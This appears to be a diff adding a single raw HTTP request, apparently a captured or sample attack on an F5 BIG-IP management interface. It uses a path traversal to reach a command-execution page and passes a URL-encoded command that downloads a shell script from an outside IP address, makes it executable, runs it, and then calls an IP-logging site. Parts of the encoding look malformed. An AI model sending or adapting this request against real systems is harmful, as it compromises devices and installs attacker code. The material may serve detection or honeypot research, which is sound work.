@@ -1,0 +1,6 @@
+GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=wget+http%253A%252F%252F136.144.41.3%252Bigipdmcdmsklcmk%252ohsitsvegawellrip.sh+%253B+chmod+777+ohsitsvegawellrip.sh+%253B+sh+ohsitsvegawellrip.sh+%253B+wget+https%253A%252F%252Fhttps:%252%252iplogger.org%2522FGVP5 HTTP/1.1
+Host: 10.27.243.60
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.25.1
